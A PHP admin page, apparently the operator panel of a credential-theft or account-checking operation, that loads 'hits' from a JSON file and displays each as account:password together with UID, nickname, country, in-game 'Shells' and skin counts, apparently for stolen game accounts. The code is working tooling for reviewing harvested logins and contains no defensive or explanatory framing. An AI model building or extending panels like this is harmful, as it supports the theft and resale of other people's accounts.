<?php
// view.php - Trang xem hit đẹp
$dataFile = __DIR__ . '/hits.json';
$hits = [];
if (file_exists($dataFile)) {
    $hits = json_decode(file_get_contents($dataFile), true) ?: [];
}
?>
<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>ASEAN MISSYOU - Admin</title>
<style>
  :root { --bg:#0f1117; --card:#1a1d27; --border:#2a2e3a; --text:#e8eaed; --muted:#9aa0a6; --accent:#7c9cff; }
  * { box-sizing:border-box; }
  body { margin:0; font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif; background:var(--bg); color:var(--text); }
  header { padding:20px 24px; border-bottom:1px solid var(--border); display:flex; justify-content:space-between; align-items:center; }
  header h1 { margin:0; font-size:20px; font-weight:600; }
  header .count { color:var(--muted); font-size:14px; }
  .container { max-width:1100px; margin:0 auto; padding:20px; }
  .card { background:var(--card); border:1px solid var(--border); border-radius:12px; padding:16px 18px; margin-bottom:14px; }
  .card-head { display:flex; justify-content:space-between; align-items:center; margin-bottom:10px; }
  .acc { font-family:ui-monospace,SFMono-Regular,Menlo,monospace; font-size:15px; color:#a8c7ff; }
  .time { color:var(--muted); font-size:12px; }
  .meta { display:flex; flex-wrap:wrap; gap:12px 18px; font-size:13px; color:var(--muted); margin-bottom:10px; }
  .meta b { color:var(--text); font-weight:500; }
  pre { margin:0; white-space:pre-wrap; word-break:break-word; font-size:13px; line-height:1.5; background:#12141c; padding:12px; border-radius:8px; border:1px solid var(--border); }
  .empty { text-align:center; color:var(--muted); padding:60px 0; }
  .badge { display:inline-block; padding:2px 8px; border-radius:999px; font-size:11px; background:#2a3142; color:#c5d0ff; }
</style>
</head>
<body>
<header>
  <h1>ASEAN MISSYOU</h1>
  <div class="count"><?= count($hits) ?> hits</div>
</header>
<div class="container">
<?php if (empty($hits)): ?>
  <div class="empty">Chưa có dữ liệu nào.</div>
<?php else: ?>
  <?php foreach ($hits as $h): ?>
  <div class="card">
    <div class="card-head">
      <div class="acc"><?= htmlspecialchars($h['account'] ?? '') ?>:<?= htmlspecialchars($h['password'] ?? '') ?></div>
      <div class="time"><?= htmlspecialchars($h['time'] ?? '') ?></div>
    </div>
    <div class="meta">
      <span>UID: <b><?= htmlspecialchars($h['uid'] ?? '-') ?></b></span>
      <span>Nick: <b><?= htmlspecialchars($h['nickname'] ?? '-') ?></b></span>
      <span>Country: <b><?= htmlspecialchars($h['country'] ?? '-') ?></b></span>
      <span>Shells: <b><?= htmlspecialchars($h['shells'] ?? '0') ?></b></span>
      <span>Skins: <b><?= htmlspecialchars($h['total_skins'] ?? '0') ?></b></span>
      <span class="badge"><?= htmlspecialchars($h['backend'] ?? '') ?></span>
    </div>
    <?php if (!empty($h['full_text'])): ?>
    <pre><?= htmlspecialchars($h['full_text']) ?></pre>
    <?php endif; ?>
  </div>
  <?php endforeach; ?>
<?php endif; ?>
</div>
</body>
</html>
